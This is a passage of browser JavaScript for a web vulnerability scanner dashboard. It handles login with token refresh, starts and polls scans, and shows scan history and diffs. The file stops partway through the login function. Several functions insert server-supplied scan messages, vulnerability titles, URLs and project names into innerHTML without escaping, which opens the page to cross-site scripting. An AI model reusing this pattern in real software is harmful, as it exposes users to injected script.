// ==================== STATE ====================
let state = {
  user: null,
  users: JSON.parse(localStorage.getItem('vs_users') || '[]'),
  projects: JSON.parse(localStorage.getItem('vs_projects') || '[]'),
  scans: JSON.parse(localStorage.getItem('vs_scans') || '[]'),
  vulns: JSON.parse(localStorage.getItem('vs_vulns') || '[]'),
  notes: JSON.parse(localStorage.getItem('vs_notes') || '[]'),
  scanRunning: false,
  scanInt: null,
  currentPage: 'dashboard',
  editingNoteId: null,
};

function save() {
  localStorage.setItem('vs_projects', JSON.stringify(state.projects));
  localStorage.setItem('vs_scans', JSON.stringify(state.scans));
  localStorage.setItem('vs_vulns', JSON.stringify(state.vulns));
  localStorage.setItem('vs_notes', JSON.stringify(state.notes));
  localStorage.setItem('vs_users', JSON.stringify(state.users));
}

// ==================== TOAST ====================
function toast(msg, type = 'info') {
  const w = document.getElementById('toast-wrap');
  const t = document.createElement('div');
  t.className = `toast ${type}`;
  t.textContent = msg;
  w.appendChild(t);
  setTimeout(() => t.remove(), 3200);
}

// ==================== THEME ====================
function setTheme(t) {
  document.documentElement.removeAttribute('data-theme');
  if (t && t !== 'cyber') document.documentElement.setAttribute('data-theme', t);
  localStorage.setItem('vs_theme', t);
  const sel = document.getElementById('theme-sel');
  if (sel) sel.value = t;
}
(function () {
  const saved = localStorage.getItem('vs_theme') || 'cyber';
  setTheme(saved);

  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.get('verified') === 'true') {
    window.history.replaceState({}, document.title, window.location.pathname);
    showErrorPopup("Email Verified", "Your email address has been verified successfully! You can now log in.");
    toast("Email verified successfully!", "success");
  }
})();

// ==================== AUTH ====================
function authTab(tab) {
  const isLogin = tab === 'login';
  document.getElementById('login-form').style.display = isLogin ? '' : 'none';
  document.getElementById('register-form').style.display = isLogin ? 'none' : '';
  document.getElementById('tab-login-btn').classList.toggle('on', isLogin);
  document.getElementById('tab-reg-btn').classList.toggle('on', !isLogin);
}

const API_BASE = window.location.protocol.startsWith('http') ? window.location.origin : 'http://127.0.0.1:5000';
let _loginAttempts = 0;

// ==================== apiFetch (auth wrapper with silent token refresh) ====================
let _refreshing = null; // single in-flight refresh promise
async function apiFetch(url, opts = {}) {
  const token = localStorage.getItem('vs_token');
  opts.headers = opts.headers || {};
  if (token) opts.headers['Authorization'] = `Bearer ${token}`;
  opts.headers['Content-Type'] = opts.headers['Content-Type'] || 'application/json';

  let resp = await fetch(url, opts);

  if (resp.status === 401) {
    // Attempt silent token refresh (coalesce parallel requests into one)
    if (!_refreshing) {
      const refreshToken = localStorage.getItem('vs_refresh_token');
      if (!refreshToken) { doLogout(); return resp; }
      _refreshing = fetch(`${API_BASE}/api/auth/refresh`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${refreshToken}`, 'Content-Type': 'application/json' }
      }).then(async r => {
        _refreshing = null;
        if (r.ok) {
          const d = await r.json();
          localStorage.setItem('vs_token', d.token);
          return d.token;
        } else {
          doLogout();
          toast('Session expired. Please sign in again.', 'info');
          return null;
        }
      }).catch(() => { _refreshing = null; doLogout(); return null; });
    }
    const newToken = await _refreshing;
    if (!newToken) return resp;
    opts.headers['Authorization'] = `Bearer ${newToken}`;
    resp = await fetch(url, opts);
  }
  return resp;
}

// ==================== Socket.IO — live scan progress ====================
let _socket = null;
let _activeScanId = null;

function initSocket() {
  if (_socket) return;
  try {
    _socket = io(API_BASE, { transports: ['websocket', 'polling'] });
    // Socket.IO is a BONUS channel — real progress comes from HTTP polling.
    // This handler only appends log lines and live vuln cards.
    // It does NOT set _activeScanId=null or stop the poller — that's the
    // poller's job alone, so the two can never fight over state.
    _socket.on('scan_progress', (data) => {
      if (data.scan_id !== _activeScanId) return;
      const log = document.getElementById('scan-log');
      if (log && data.message) {
        const line = document.createElement('div');
        line.style.cssText = 'padding:2px 0;border-bottom:1px solid rgba(255,255,255,.04)';
        const ico = data.vulnerability ? '\uD83D\uDD34' : '\uD83D\uDD35';
        line.innerHTML = `<span style="color:var(--text3);margin-right:8px">[${new Date().toTimeString().slice(0,8)}]</span>${ico} ${data.message}`;
        log.appendChild(line);
        log.scrollTop = log.scrollHeight;
      }
      if (data.vulnerability) {
        const r = document.getElementById('scan-results');
        if (r) {
          const v = data.vulnerability;
          const sevClass = { critical: 'bc', high: 'bh', medium: 'bm', low: 'bl', info: 'bi' }[v.severity] || 'bi';
          const card = document.createElement('div');
          card.style.cssText = 'padding:8px 10px;background:rgba(255,255,255,.04);border-radius:8px;margin-bottom:6px;border:1px solid var(--border);display:flex;gap:8px;align-items:flex-start';
          card.innerHTML = `<span class="badge ${sevClass}" style="flex-shrink:0">${v.severity}</span><span style="font-size:12px;color:var(--text2);line-height:1.4">${v.title}</span>`;
          r.appendChild(card);
        }
      }
    });
  } catch (e) {
    console.warn('Socket.IO init failed:', e);
  }
}


// ==================== FORCED PASSWORD CHANGE ====================
function showForcedPasswordChange() {
  const modal = document.getElementById('force-pw-modal');
  if (modal) {
    modal.style.display = 'flex';
    setTimeout(() => { const el = document.getElementById('fpc-cur'); if (el) el.focus(); }, 100);
  }
}

async function doForcePasswordChange() {
  const cur = document.getElementById('fpc-cur').value;
  const nw = document.getElementById('fpc-new').value;
  const conf = document.getElementById('fpc-conf').value;
  const errEl = document.getElementById('force-pw-err');
  errEl.style.display = 'none';

  if (!cur || !nw || !conf) { errEl.textContent = 'All fields are required.'; errEl.style.display = 'block'; return; }
  if (nw !== conf) { errEl.textContent = 'New passwords do not match.'; errEl.style.display = 'block'; return; }
  if (nw.length < 8) { errEl.textContent = 'Password must be at least 8 characters.'; errEl.style.display = 'block'; return; }
  if (!/[A-Za-z]/.test(nw) || !/\d/.test(nw)) { errEl.textContent = 'Password must contain both letters and numbers.'; errEl.style.display = 'block'; return; }
  if (nw === cur) { errEl.textContent = 'New password must be different from the current password.'; errEl.style.display = 'block'; return; }

  const btn = document.getElementById('fpc-btn');
  btn.disabled = true; btn.innerHTML = '⏳ Updating...';

  try {
    const resp = await apiFetch(`${API_BASE}/api/auth/change-password`, {
      method: 'POST',
      body: JSON.stringify({ current_password: cur, new_password: nw })
    });
    const data = await resp.json();
    if (resp.ok) {
      document.getElementById('force-pw-modal').style.display = 'none';
      if (state.user) state.user.must_change_password = false;
      toast('Password changed successfully! Welcome to VulnScan Pro.', 'success');
      initApp();
    } else {
      errEl.textContent = data.error || 'Password change failed. Please try again.';
      errEl.style.display = 'block';
    }
  } catch (e) {
    errEl.textContent = 'Connection error. Please check the server is running.';
    errEl.style.display = 'block';
  } finally {
    btn.disabled = false; btn.innerHTML = '🔐 Set New Password & Continue';
  }
}

// ==================== REAL BACKEND SCANNER ====================
function onScanAuthModeChange() {
  const mode = document.getElementById('scan-auth-mode').value;
  const extra = document.getElementById('scan-auth-extra');
  const label = document.getElementById('scan-auth-label');
  const input = document.getElementById('scan-auth-value');
  if (mode === 'none') {
    extra.style.display = 'none';
  } else {
    extra.style.display = 'block';
    if (mode === 'cookie') { label.textContent = 'Cookie string (e.g. session=abc123)'; input.placeholder = 'session=abc123; other=val'; }
    if (mode === 'bearer') { label.textContent = 'Bearer token value'; input.placeholder = 'eyJhbG...'; }
  }
}

async function startRealScan() {
  if (state.scanRunning) { toast('A scan is already running', 'error'); return; }
  const url = document.getElementById('surl').value.trim();
  if (!url) { toast('Enter a target URL', 'error'); return; }
  try { new URL(url); } catch { toast('Invalid URL format', 'error'); return; }

  const authMode = document.getElementById('scan-auth-mode') ? document.getElementById('scan-auth-mode').value : 'none';
  const authValue = document.getElementById('scan-auth-value') ? document.getElementById('scan-auth-value').value.trim() : '';
  const config = { auth: { mode: authMode, value: authValue } };

  const btn = document.getElementById('scan-btn');
  const cancelBtn = document.getElementById('cancel-scan-btn');
  btn.disabled = true; btn.innerHTML = '<span class="spin"></span> Starting...';
  if (cancelBtn) cancelBtn.style.display = 'inline-flex';

  const log = document.getElementById('scan-log');
  const progWrap = document.getElementById('scan-prog-wrap');
  const progBar = document.getElementById('scan-prog-bar');
  const phase = document.getElementById('scan-phase');
  const pct = document.getElementById('scan-pct');
  const results = document.getElementById('scan-results');
  log.innerHTML = ''; if (results) results.innerHTML = '';
  if (progWrap) progWrap.style.display = 'block';
  if (progBar) progBar.style.width = '0%';
  if (pct) pct.textContent = '0%';
  if (phase) phase.textContent = 'Initializing...';

  // We need a target_id. Try to create a project+target on the fly or use selected project
  try {
    // 1. Create a temporary target — find or create a project
    let projectId = '';
    const projSel = document.getElementById('scan-project-sel');
    if (projSel && projSel.value) {
      // get targets for this project
      const tResp = await apiFetch(`${API_BASE}/api/projects/${projSel.value}/targets`);
      if (tResp.ok) {
        const tData = await tResp.json();
        const existing = tData.find(t => t.url === url || t.url === url.replace(/\/$/, ''));
        if (existing) {
          return _launchScanOnTarget(existing.id, config, btn, cancelBtn);
        }
      }
      projectId = projSel.value;
    } else {
      // Create a quick project
      const pResp = await apiFetch(`${API_BASE}/api/projects`, {
        method: 'POST',
        body: JSON.stringify({ name: `Quick Scan — ${new URL(url).hostname}`, description: 'Auto-created by scanner' })
      });
      if (!pResp.ok) { toast('Failed to create project', 'error'); _resetScanBtn(btn, cancelBtn); return; }
      const pData = await pResp.json();
      projectId = pData.id;
    }
    // 2. Create target
    const tResp = await apiFetch(`${API_BASE}/api/targets`, {
      method: 'POST',
      body: JSON.stringify({ url, name: new URL(url).hostname, project_id: projectId })
    });
    if (!tResp.ok) { toast('Failed to create target', 'error'); _resetScanBtn(btn, cancelBtn); return; }
    const tData = await tResp.json();
    await _launchScanOnTarget(tData.id, config, btn, cancelBtn);
  } catch (e) {
    toast('Scan failed: ' + e.message, 'error');
    _resetScanBtn(btn, cancelBtn);
  }
}

let _scanTimerInt = null;
let _scanStartTime = null;

function startScanTimer() {
  const timerEl = document.getElementById('scan-timer');
  if (timerEl) {
    timerEl.textContent = '00:00';
    timerEl.style.display = 'inline';
  }
  _scanStartTime = Date.now();
  if (_scanTimerInt) clearInterval(_scanTimerInt);
  _scanTimerInt = setInterval(() => {
    if (!state.scanRunning) {
      stopScanTimer();
      return;
    }
    const elapsed = Math.floor((Date.now() - _scanStartTime) / 1000);
    const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
    const secs = String(elapsed % 60).padStart(2, '0');
    if (timerEl) timerEl.textContent = `${mins}:${secs}`;
  }, 1000);
}

function stopScanTimer() {
  if (_scanTimerInt) {
    clearInterval(_scanTimerInt);
    _scanTimerInt = null;
  }
  const timerEl = document.getElementById('scan-timer');
  if (timerEl) timerEl.style.display = 'none';
}

async function _launchScanOnTarget(targetId, config, btn, cancelBtn) {
  const engine = document.getElementById('scan-engine-sel')
    ? document.getElementById('scan-engine-sel').value : 'native';
  const endpoint = engine === 'zap'
    ? `${API_BASE}/api/zap/scan/start`
    : `${API_BASE}/api/scans`;

  const resp = await apiFetch(endpoint, {
    method: 'POST',
    body: JSON.stringify({ target_id: targetId, config })
  });
  if (!resp.ok) {
    const d = await resp.json().catch(() => ({}));
    toast('Scan failed: ' + (d.message || d.error || 'unknown'), 'error');
    _resetScanBtn(btn, cancelBtn);
    return;
  }
  const scanResp = await resp.json();
  const scanId   = scanResp.id || scanResp.scan_id;
  _activeScanId  = scanId;
  state.scanRunning = true;
  btn.innerHTML = '<span class="spin"></span> Scanning...';
  startScanTimer();
  toast('Scan started!', 'success');

  // Show progress container
  const progWrap = document.getElementById('scan-prog-wrap');
  if (progWrap) progWrap.style.display = 'block';
  const progBar  = document.getElementById('scan-prog-bar');
  const phaseEl  = document.getElementById('scan-phase');
  const pctEl    = document.getElementById('scan-pct');
  if (progBar) progBar.style.width = '2%';
  if (pctEl)   pctEl.textContent = '2%';
  if (phaseEl) phaseEl.textContent = 'Initialising scan…';

  // ── Socket.IO (best-effort bonus channel) ───────────────────────────
  initSocket();
  if (_socket) _socket.emit('join_scan', { scan_id: scanId });

  // ── HTTP polling — THE primary progress mechanism ────────────────────
  // Use the raw-SQL /api/zap/scan/status endpoint for ZAP scans so we
  // bypass SQLAlchemy’s identity-map cache (which kept returning stale
  // progress=2 instead of the live value committed by the background task).
  const pollUrl = engine === 'zap'
    ? `${API_BASE}/api/zap/scan/status/${scanId}`
    : `${API_BASE}/api/scans/${scanId}`;

  // Self-contained: uses a local `done` flag that only THIS closure sets.
  // Nothing outside can kill it early — not Socket.IO, not _activeScanId.
  let done = false;

  async function pollOnce() {
    if (done) return;
    try {
      const r = await apiFetch(pollUrl);
      if (!r.ok) {
        console.warn('[poll] HTTP', r.status, 'for scan', scanId);
        if (r.status === 404) { done = true; _resetScanBtn(btn, cancelBtn); }
        return;
      }
      const d    = await r.json();
      const pct  = typeof d.progress === 'number' ? d.progress : 0;
      const stat = d.status || 'running';

      // Update progress bar — always advance, never go backwards
      const cur = parseFloat((progBar && progBar.style.width) || '0') || 0;
      if (pct > cur) {
        if (progBar) progBar.style.width = pct + '%';
        if (pctEl)   pctEl.textContent   = pct + '%';
      }
      if (phaseEl) {
        phaseEl.textContent = stat === 'running'
          ? (pct > 0 ? `Scanning… ${pct}%` : 'Initialising…')
          : stat;
      }

      console.log(`[poll] scan=${scanId.slice(0,8)} status=${stat} progress=${pct}%`);

      if (stat === 'completed' || stat === 'failed' || stat === 'cancelled') {
        done = true;
        _activeScanId = null;
        _resetScanBtn(btn, cancelBtn);
        stopScanTimer();

        if (stat === 'completed') {
          if (progBar) progBar.style.width = '100%';
          if (pctEl)   pctEl.textContent = '100%';
          if (phaseEl) phaseEl.textContent = `Scan complete — ${d.vuln_count || 0} finding(s)`;
          toast('Scan completed!', 'success');

          // Load and render vulnerabilities
          try {
            const vr = await apiFetch(`${API_BASE}/api/scans/${scanId}/vulnerabilities`);
            if (vr.ok) {
              const vulns = await vr.json();
              const res = document.getElementById('scan-results');
              if (res && vulns.length) {
                res.innerHTML = vulns.map(v => {
                  const sc = {critical:'bc',high:'bh',medium:'bm',low:'bl',info:'bi'}[v.severity]||'bi';
                  return `<div style="padding:8px 10px;background:rgba(255,255,255,.04);border-radius:8px;margin-bottom:6px;border:1px solid var(--border);display:flex;gap:8px;align-items:flex-start">
                    <span class="badge ${sc}" style="flex-shrink:0">${v.severity}</span>
                    <span style="font-size:12px;color:var(--text2);line-height:1.4">${v.title}</span>
                  </div>`;
                }).join('');
              }
            }
          } catch (_) {}

        } else if (stat === 'cancelled') {
          if (phaseEl) phaseEl.textContent = 'Cancelled';
          toast('Scan cancelled.', 'info');
        } else {
          if (phaseEl) phaseEl.textContent = 'Scan failed';
          toast('Scan failed.', 'error');
        }
        syncStateWithBackend();
        // Refresh the scan history card so new result appears immediately
        loadScanHistory();

      }
    } catch (err) {
      console.warn('[poll] error:', err);
    }
  }

  // First poll after 1s (give the background task time to write progress=2),
  // then every 1.5 seconds for smooth live updates.
  setTimeout(pollOnce, 1000);
  const _timer = setInterval(async () => {
    if (done) { clearInterval(_timer); return; }
    await pollOnce();
  }, 1500);
}




function _resetScanBtn(btn, cancelBtn) {
  state.scanRunning = false;
  stopScanTimer();
  if (btn) { btn.disabled = false; btn.innerHTML = '&#x1F680; Start Scan'; }
  if (cancelBtn) cancelBtn.style.display = 'none';
}

async function cancelCurrentScan() {
  if (!_activeScanId) { toast('No scan running', 'info'); return; }
  try {
    const engine = document.getElementById('scan-engine-sel') ? document.getElementById('scan-engine-sel').value : 'native';
    const cancelEndpoint = engine === 'zap' ? `${API_BASE}/api/zap/scan/stop/${_activeScanId}` : `${API_BASE}/api/scans/${_activeScanId}`;
    const cancelMethod = engine === 'zap' ? 'POST' : 'DELETE';
    await apiFetch(cancelEndpoint, { method: cancelMethod });
    toast('Cancellation requested…', 'info');
  } catch (e) {
    toast('Failed to cancel: ' + e.message, 'error');
  }
}

// Populate project dropdown when Scanner page loads
async function populateScanProjectDropdown() {
  const sel = document.getElementById('scan-project-sel');
  if (!sel) return;
  try {
    const r = await apiFetch(`${API_BASE}/api/projects`);
    if (!r.ok) return;
    const projects = await r.json();
    sel.innerHTML = '<option value="">— Select a project (optional) —</option>' +
      projects.map(p => `<option value="${p.id}">${p.name}</option>`).join('');
  } catch (e) { }
}

// ==================== STATE SYNC WITH BACKEND ====================
async function syncStateWithBackend() {
  try {
    const pResp = await apiFetch(`${API_BASE}/api/projects`);
    if (pResp && pResp.ok) {
      const projs = await pResp.json();
      if (Array.isArray(projs)) state.projects = projs;
    }
    const sResp = await apiFetch(`${API_BASE}/api/scans`);
    if (sResp && sResp.ok) {
      const scs = await sResp.json();
      if (Array.isArray(scs)) state.scans = scs;
    }
    const vResp = await apiFetch(`${API_BASE}/api/vulnerabilities`);
    if (vResp && vResp.ok) {
      const vls = await vResp.json();
      if (Array.isArray(vls)) state.vulns = vls;
    }
    save();
  } catch (e) {
    console.warn("Failed to sync state with backend:", e);
  }
}

// ==================== SCAN HISTORY ====================
let _scanHistoryCache = [];

async function loadScanHistory() {
  const listEl = document.getElementById('scan-history-list');
  if (!listEl) return;
  listEl.innerHTML = '<div class="ph"><span class="spin"></span> Loading…</div>';
  try {
    const r = await apiFetch(`${API_BASE}/api/scans`);
    if (!r.ok) { listEl.innerHTML = '<div class="ph" style="color:var(--red)">Failed to load scan history.</div>'; return; }
    const scans = await r.json();
    _scanHistoryCache = Array.isArray(scans) ? scans : [];
    renderScanHistory();
  } catch (e) {
    listEl.innerHTML = '<div class="ph" style="color:var(--red)">Error loading scans.</div>';
  }
}

function renderScanHistory() {
  const listEl = document.getElementById('scan-history-list');
  if (!listEl) return;
  const scans = [..._scanHistoryCache].sort((a, b) => (b.ts || 0) - (a.ts || 0));
  if (!scans.length) {
    listEl.innerHTML = '<div class="ph">No scans found. Run your first scan above!</div>';
    return;
  }

  const sevColor = { critical: 'var(--red)', high: '#f97316', medium: '#eab308', low: '#22c55e', info: 'var(--text3)' };
  const statusBadge = (s) => {
    const cfg = { completed: ['#22c55e','✅'], running: ['var(--cyan)','⚙️'], failed: ['var(--red)','❌'], pending: ['var(--text3)','⏳'], cancelled: ['#f97316','⚠️'] };
    const [color, ico] = cfg[s] || ['var(--text3)', '?'];
    return `<span style="display:inline-flex;align-items:center;gap:4px;font-size:11px;padding:2px 8px;border-radius:99px;background:${color}22;color:${color};font-weight:600">${ico} ${s}</span>`;
  };
  const engineBadge = (e) => {
    const isZap = e === 'zap';
    return `<span style="font-size:10px;padding:2px 6px;border-radius:5px;background:${isZap ? 'rgba(99,102,241,.2)' : 'rgba(34,197,94,.15)'};color:${isZap ? '#818cf8' : '#22c55e'};font-weight:600">${isZap ? 'ZAP' : 'Lite'}</span>`;
  };
  const fmtDuration = (scan) => {
    if (!scan.started_at || !scan.completed_at) return '—';
    const s = Math.round((new Date(scan.completed_at) - new Date(scan.started_at)) / 1000);
    return s < 60 ? `${s}s` : `${Math.floor(s/60)}m ${s%60}s`;
  };
  const fmtTime = (scan) => {
    if (!scan.started_at) return '—';
    return new Date(scan.started_at).toLocaleString(undefined, { month:'short', day:'numeric', hour:'2-digit', minute:'2-digit' });
  };

  listEl.innerHTML = scans.map((scan, idx) => {
    const url = scan.url || '(unknown)';
    const shortUrl = url.length > 45 ? url.slice(0, 45) + '…' : url;
    const vc = scan.vuln_count || scan.vulnCount || 0;
    const sev = scan.severity_breakdown || {};
    const sevPills = ['critical','high','medium','low'].filter(k => sev[k]).map(k =>
      `<span style="font-size:10px;padding:1px 5px;border-radius:4px;background:${sevColor[k]}22;color:${sevColor[k]};font-weight:700">${sev[k]} ${k.slice(0,1).toUpperCase()}</span>`
    ).join(' ');
    const canView = scan.status === 'completed' && vc > 0;
    return `<div style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-bottom:1px solid var(--border);transition:background .15s;cursor:default" 
        onmouseenter="this.style.background='rgba(255,255,255,.03)'" onmouseleave="this.style.background=''">
      <div style="flex:1;min-width:0">
        <div style="display:flex;align-items:center;gap:7px;margin-bottom:3px;flex-wrap:wrap">
          ${engineBadge(scan.scan_engine || 'native')}
          <span style="font-size:12.5px;font-weight:600;color:var(--text1);font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:260px" title="${url}">${shortUrl}</span>
        </div>
        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
          ${statusBadge(scan.status)}
          <span style="font-size:11px;color:var(--text3)">🕐 ${fmtTime(scan)}</span>
          <span style="font-size:11px;color:var(--text3)">⏱ ${fmtDuration(scan)}</span>
          ${vc > 0 ? `<span style="font-size:11px;color:var(--text2);font-weight:600">⚠️ ${vc} finding${vc !== 1 ? 's' : ''}</span>` : '<span style="font-size:11px;color:var(--text3)">No findings</span>'}
          ${sevPills}
        </div>
      </div>
      <div style="display:flex;gap:6px;flex-shrink:0">
        ${canView
          ? `<button class="btn btn-p btn-sm" onclick="viewScanResults('${scan.id}','${url.replace(/'/g,"\\'")}')">🔍 View Results</button>`
          : scan.status === 'completed'
            ? `<span style="font-size:11px;color:var(--text3);padding:4px 8px">No vulns</span>`
            : `<span style="font-size:11px;color:var(--text3);padding:4px 8px">${scan.status}</span>`
        }
        <button class="btn btn-g btn-sm" onclick="prefillScanFromHistory('${url.replace(/'/g,"\\'")}')">↩ Rescan</button>
      </div>
    </div>`;
  }).join('');
}

function viewScanResults(scanId, url) {
  // Set the global scan filter so renderVulns() shows only this scan's findings
  currentScanId = scanId;
  // Navigate to vulnerabilities page — renderVulns is called by nav()
  nav('vulns');
  // Show a toast so user knows it's filtered
  toast(`Showing results for: ${(url || '').slice(0, 60)}`, 'info');
}

function prefillScanFromHistory(url) {
  const inp = document.getElementById('surl');
  if (inp) { inp.value = url; inp.focus(); }
  // Scroll to the top of the scanner page
  document.getElementById('page-scanner')?.scrollTo({ top: 0, behavior: 'smooth' });
}

async function compareScans() {
  const scanA = document.getElementById('diff-scan-a').value;
  const scanB = document.getElementById('diff-scan-b').value;
  const resultsDiv = document.getElementById('diff-results');
  if (!scanA || !scanB) {
    toast('Please select two scans to compare', 'error');
    return;
  }
  if (scanA === scanB) {
    toast('Please select two different scans', 'error');
    return;
  }
  resultsDiv.style.display = 'block';
  resultsDiv.innerHTML = '<div class="ph"><span class="spin"></span> Loading comparison...</div>';

  try {
    const resp = await apiFetch(`${API_BASE}/api/scans/${scanB}/diff/${scanA}`);
    if (!resp.ok) {
      const err = await resp.json().catch(() => ({}));
      resultsDiv.innerHTML = `<div class="ph" style="color:var(--red)">Comparison failed: ${err.error || 'unknown server error'}</div>`;
      return;
    }
    const data = await resp.json();
    const { new: newFindings, fixed: fixedFindings, persistent: persistentFindings, summary } = data;

    const badge = (sev) => {
      const map = { critical: 'bc', high: 'bh', medium: 'bm', low: 'bl', info: 'bi' };
      return `<span class="badge ${map[sev] || 'bi'}">${sev}</span>`;
    };

    const renderSection = (title, icon, list, color) => {
      if (!list || !list.length) return '';
      return `
            <div style="margin-bottom:12px">
              <div style="font-size:12px;font-weight:700;color:${color};margin-bottom:6px">${icon} ${title} (${list.length})</div>
              ${list.map(v => `
                <div style="display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:12px">
                  ${badge(v.severity)}
                  <span style="color:var(--text2);font-weight:600">${v.title}</span>
                  <span style="color:var(--text3);font-size:11px;font-family:var(--mono);word-break:break-all">${v.affected_url}</span>
                </div>
              `).join('')}
            </div>
          `;
    };

    let html = `
          <div style="margin-bottom:14px;background:rgba(255,255,255,.02);padding:10px;border-radius:6px;border:1px solid var(--border)">
            <div style="font-size:12px;font-weight:800;margin-bottom:6px">Comparison Summary:</div>
            <div style="display:flex;gap:15px;font-size:11.5px;color:var(--text2)">
              <div>🆕 <strong style="color:var(--cyan)">${summary.new_count}</strong> new</div>
              <div>✅ <strong style="color:var(--green)">${summary.fixed_count}</strong> fixed</div>
              <div>🔁 <strong style="color:var(--purple)">${summary.persistent_count}</strong> persistent</div>
            </div>
          </div>
        `;

    if (!summary.new_count && !summary.fixed_count && !summary.persistent_count) {
      html += '<div class="ph">No differences or findings detected.</div>';
    } else {
      html += renderSection('New Findings (Detected in current, not in previous)', '🆕', newFindings, 'var(--cyan)');
      html += renderSection('Fixed Findings (Resolved since previous)', '✅', fixedFindings, 'var(--green)');
      html += renderSection('Persistent Findings (Unresolved)', '🔁', persistentFindings, 'var(--purple)');
    }

    resultsDiv.innerHTML = html;
  } catch (e) {
    resultsDiv.innerHTML = `<div class="ph" style="color:var(--red)">Connection error while comparing scans.</div>`;
  }
}

// ==================== SKELETON LOADERS (Tier 2A) ====================
function _skeletonRows(n, cols) {
  return Array(n).fill(0).map(() =>
    `<tr>${Array(cols).fill(0).map(() => `<td><div class="sk-line" style="width:${60 + Math.random() * 35 | 0}%"></div></td>`).join('')}</tr>`
  ).join('');
}
function _skeletonCards(n) {
  return Array(n).fill(0).map(() =>
    `<div class="card" style="padding:20px"><div class="sk-line" style="width:55%;margin-bottom:10px"></div><div class="sk-line" style="width:80%;height:8px"></div><div class="sk-line" style="width:40%;height:8px;margin-top:8px"></div></div>`
  ).join('');
}
function dashboardSkeleton() {
  return `<div class="g4">${Array(4).fill(0).map(() => `<div class="card" style="padding:20px;min-height:90px"><div class="sk-line" style="width:40%;margin-bottom:12px"></div><div class="sk-line" style="width:60%;height:24px;margin-bottom:8px"></div><div class="sk-line" style="width:50%;height:8px"></div></div>`).join('')}</div>`;
}
function vulnsSkeleton() {
  return `<table class="tbl"><thead><tr><th>Severity</th><th>Title</th><th>URL</th><th>Type</th></tr></thead><tbody>${_skeletonRows(6, 4)}</tbody></table>`;
}
function reportsSkeleton() { return _skeletonCards(3); }
function projectsSkeleton() { return _skeletonCards(3); }

// ==================== DEBOUNCED QUICK SEARCH (Tier 2D) ====================
let _searchTimer = null;
function quickSearch(val) {
  clearTimeout(_searchTimer);
  _searchTimer = setTimeout(() => _applyQuickSearch(val), 250);
}
function _applyQuickSearch(val) {
  const q = val.trim().toLowerCase();
  const page = state.currentPage;
  if (page === 'vulns') {
    const si = document.getElementById('vuln-search');
    if (si && si.value !== val) si.value = val;
    renderVulns(q);
  } else if (page === 'projects') {
    document.querySelectorAll('#proj-list .card').forEach(card => {
      const text = card.textContent.toLowerCase();
      card.style.display = (!q || text.includes(q)) ? '' : 'none';
    });
  } else if (page === 'dashboard') {
    document.querySelectorAll('#dash-top-vulns .top-vuln-row').forEach(row => {
      row.style.display = (!q || row.textContent.toLowerCase().includes(q)) ? '' : 'none';
    });
    document.querySelectorAll('#dash-scans tbody tr').forEach(row => {
      row.style.display = (!q || row.textContent.toLowerCase().includes(q)) ? '' : 'none';
    });
  }
}

// ==================== ACCESSIBILITY HELPERS (Tier 2C) ====================
function applyARIA() {
  document.querySelectorAll('.si').forEach(el => {
    el.setAttribute('role', 'button');
    el.setAttribute('tabindex', '0');
    const lbl = el.getAttribute('data-tip') || el.querySelector('.si-lbl')?.textContent || 'Navigation item';
    el.setAttribute('aria-label', lbl);
    el.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); el.click(); } });
  });
  // Modals
  document.querySelectorAll('.mover').forEach(mover => {
    const modal = mover.querySelector('.modal, .acard');
    if (modal) {
      mover.setAttribute('role', 'dialog');
      mover.setAttribute('aria-modal', 'true');
      const title = modal.querySelector('.mtitle, .logo-title, h2');
      if (title) {
        if (!title.id) title.id = 'modal-title-' + Math.random().toString(36).slice(2, 7);
        mover.setAttribute('aria-labelledby', title.id);
      }
    }
  });
}

// Focus trap for modals — call focusTrap(modalEl) on open, removeFocusTrap(modalEl) on close
function focusTrap(modal) {
  const focusable = 'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])';
  const els = [...modal.querySelectorAll(focusable)].filter(el => !el.disabled);
  if (!els.length) return;
  els[0].focus();
  modal._trapHandler = (e) => {
    if (e.key !== 'Tab') return;
    const first = els[0], last = els[els.length - 1];
    if (e.shiftKey) { if (document.activeElement === first) { e.preventDefault(); last.focus(); } }
    else { if (document.activeElement === last) { e.preventDefault(); first.focus(); } }
  };
  modal.addEventListener('keydown', modal._trapHandler);
}
function removeFocusTrap(modal) {
  if (modal._trapHandler) { modal.removeEventListener('keydown', modal._trapHandler); delete modal._trapHandler; }
}


function clearErrors(formId) {
  const container = document.getElementById(formId);
  if (!container) return;
  container.querySelectorAll('.fi').forEach(el => el.classList.remove('err-border'));
  container.querySelectorAll('.err-hint').forEach(el => {
    el.textContent = '';
    el.style.display = 'none';
  });
}

function showFieldError(fieldId, msg) {
  const el = document.getElementById(fieldId);
  if (el) {
    el.classList.add('err-border');
    const hint = document.getElementById(`err-${fieldId}`);
    if (hint) {
      hint.textContent = msg;
      hint.style.display = 'block';
    }
  }
}

function showErrorPopup(title, msg) {
  document.getElementById('error-popup-title').textContent = title;
  document.getElementById('error-popup-message').textContent = msg;
  document.getElementById('error-popup-modal').style.display = 'flex';
}

async function doLogin() {
  clearErrors('login-form');
  const u = document.getElementById('lu').value.trim();
  const p = document.getElementById('lp').value;

  let clientValid = true;
  if (!u) { showFieldError('lu', 'Username is required'); clientValid = false; }
  if (!p) { showFieldError('lp', 'Password is required'); clientValid = false; }
  if (!clientValid) { toast('Enter username and password', 'error'); return; }

  const btn = document.getElementById('lbtn');
  const origText = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '&#x23F3; Signing in...';
  btn.style.opacity = '0.6';

  const startTime = Date.now();

  try {
    const resp = await fetch(`${API_BASE}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: u, password: p })
    });
    const data = await resp.json();
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);

    if (resp.ok) {
      _loginAttempts = 0;
      const counter = document.getElementById('login-attempt-counter');
      if (counter) counter.remove();

      localStorage.setItem('vs_token', data.token);
      if (data.refresh_token) localStorage.setItem('vs_refresh_token', data.refresh_token);
      const user = data.user;
